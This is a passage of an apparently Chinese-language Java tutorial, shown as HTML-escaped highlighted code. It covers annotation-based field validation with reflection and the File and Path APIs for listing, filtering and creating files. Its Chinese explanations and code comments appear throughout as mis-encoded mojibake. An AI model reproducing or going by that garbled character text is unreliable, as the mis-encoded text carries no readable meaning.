&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">check&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#111">person&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IllegalArgumentException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ReflectiveOperationException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// éå†æ‰€æœ‰Field:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getFields&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// è·å–Fieldå®šä¹‰çš„@Range:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Range&lt;/span> &lt;span style="color:#111">range&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getAnnotation&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Range&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// å¦‚æœ@Rangeå­˜åœ¨:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">range&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// è·å–Fieldçš„å€¼:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">person&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// å¦‚æœå€¼æ˜¯String:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">value&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// åˆ¤æ–­å€¼æ˜¯å¦æ»¡è¶³@Rangeçš„min/max:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">min&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">max&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalArgumentException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Invalid field: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬é€šè¿‡&lt;code>@Range&lt;/code>æ³¨è§£ï¼Œé…åˆ&lt;code>check()&lt;/code>æ–¹æ³•ï¼Œå°±å¯ä»¥å®Œæˆ&lt;code>Person&lt;/code>å®ä¾‹çš„æ£€æŸ¥ã€‚æ³¨æ„æ£€æŸ¥é€»è¾‘å®Œå…¨æ˜¯æˆ‘ä»¬è‡ªå·±ç¼–å†™çš„ï¼ŒJVMä¸ä¼šè‡ªåŠ¨ç»™æ³¨è§£æ·»åŠ ä»»ä½•é¢å¤–çš„é€»è¾‘ã€‚&lt;/p>
&lt;h2 id="io">IO&lt;/h2>
&lt;h3 id="filepath">File&amp;amp;Path&lt;/h3>
&lt;ul>
&lt;li>æ ‡å‡†åº“&lt;code>java.io&lt;/code>æä¾›&lt;code>File&lt;/code>å¯¹è±¡æ¥æ“ä½œæ–‡ä»¶å’Œç›®å½•ï¼Œå¯ä»¥ä¼ å…¥ç»å¯¹è·¯å¾„å’Œç›¸å¯¹è·¯å¾„ï¼›å³ä½¿ä¼ å…¥çš„ä¸å­˜åœ¨ä¹Ÿä¸æŠ¥é”™ï¼Œå¯ä»¥ç”¨&lt;code>isFile&lt;/code>, &lt;code>isDirectory&lt;/code>è¿›è¡Œæ£€æŸ¥&lt;/li>
&lt;li>&lt;code>File&lt;/code>å¯¹è±¡æ—¢å¯ä»¥è¡¨ç¤ºæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥è¡¨ç¤ºç›®å½•ï¼Œå¯ä»¥ç”¨&lt;code>getPath&lt;/code>(ä¼ å…¥è·¯å¾„), &lt;code>getAbsolutePath&lt;/code>(ç»å¯¹è·¯å¾„), &lt;code>getCanonicalPath&lt;/code>(è§„èŒƒè·¯å¾„)&lt;/li>
&lt;li>å½“Fileå¯¹è±¡è¡¨ç¤ºä¸€ä¸ªç›®å½•æ—¶ï¼Œå¯ä»¥ä½¿ç”¨&lt;code>list()&lt;/code>å’Œ&lt;code>listFiles()&lt;/code>åˆ—å‡ºç›®å½•ä¸‹çš„æ–‡ä»¶å’Œå­ç›®å½•åï¼Œ&lt;code>listFiles()&lt;/code>æä¾›äº†ä¸€ç³»åˆ—é‡è½½æ–¹æ³•ï¼Œå¯ä»¥è¿‡æ»¤ä¸æƒ³è¦çš„æ–‡ä»¶å’Œç›®å½•&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">File&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">File&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;C:\\Windows&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">File&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">fs1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">listFiles&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// åˆ—å‡ºæ‰€æœ‰æ–‡ä»¶å’Œå­ç›®å½•
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">printFiles&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fs1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">File&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">fs2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">listFiles&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FilenameFilter&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// ä»…åˆ—å‡º.exeæ–‡ä»¶
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#75af00">accept&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">File&lt;/span> &lt;span style="color:#111">dir&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">endsWith&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// è¿”å›trueè¡¨ç¤ºæ¥å—è¯¥æ–‡ä»¶
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">printFiles&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fs2&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">printFiles&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">File&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">files&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;==========&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">files&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">File&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">files&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;==========&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>å…¶å®ƒAPI&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>boolean canRead()ï¼šæ˜¯å¦å¯è¯»
boolean canWrite()ï¼šæ˜¯å¦å¯å†™
boolean canExecute()ï¼šæ˜¯å¦å¯æ‰§è¡Œ
long length()ï¼šæ–‡ä»¶å­—èŠ‚å¤§å°
boolean mkdir()ï¼šåˆ›å»ºå½“å‰Fileå¯¹è±¡è¡¨ç¤ºçš„ç›®å½•
boolean mkdirs()ï¼šåˆ›å»ºå½“å‰Fileå¯¹è±¡è¡¨ç¤ºçš„ç›®å½•ï¼Œå¹¶åœ¨å¿…è¦æ—¶å°†ä¸å­˜åœ¨çš„çˆ¶ç›®å½•ä¹Ÿåˆ›å»ºå‡ºæ¥
boolean delete()ï¼šåˆ é™¤å½“å‰Fileå¯¹è±¡è¡¨ç¤ºçš„ç›®å½•ï¼Œå½“å‰ç›®å½•å¿…é¡»ä¸ºç©ºæ‰èƒ½åˆ é™¤æˆåŠŸ
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>å¯ä»¥ç”¨&lt;code>createTempFile()&lt;/code>æ¥åˆ›å»ºä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œä»¥åŠ&lt;code>deleteOnExit()&lt;/code>åœ¨JVMé€€å‡ºæ—¶è‡ªåŠ¨åˆ é™¤è¯¥æ–‡ä»¶&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">File&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">File&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createTempFile&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;tmp-&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// æä¾›ä¸´æ—¶æ–‡ä»¶çš„å‰ç¼€å’Œåç¼€
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">deleteOnExit&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// JVMé€€å‡ºæ—¶è‡ªåŠ¨åˆ é™¤
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isFile&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getAbsolutePath&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;code>Path&lt;/code>å¯¹è±¡ä½äº&lt;code>java.nio.file&lt;/code>åŒ…ï¼Œå’Œ&lt;code>File&lt;/code>å¯¹è±¡ç±»ä¼¼ï¼Œä½†æ“ä½œæ›´åŠ ç®€å•ï¼Œä¾¿äºæ“ä½œç›®å½•çš„æ‹¼æ¥ã€éå†ç­‰&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.nio.file.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Path&lt;/span> &lt;span style="color:#111">p1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;project&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;study&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// æ„é€ ä¸€ä¸ªPathå¯¹è±¡
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Path&lt;/span> &lt;span style="color:#111">p2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">p1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toAbsolutePath&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// è½¬æ¢ä¸ºç»å¯¹è·¯å¾„
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p2&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Path&lt;/span> &lt;span style="color:#111">p3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">p2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">normalize&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// è½¬æ¢ä¸ºè§„èŒƒè·¯å¾„
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p3&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">File&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">p3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toFile&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// è½¬æ¢ä¸ºFileå¯¹è±¡
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Path&lt;/span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;..&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">toAbsolutePath&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// å¯ä»¥ç›´æ¥éå†Path
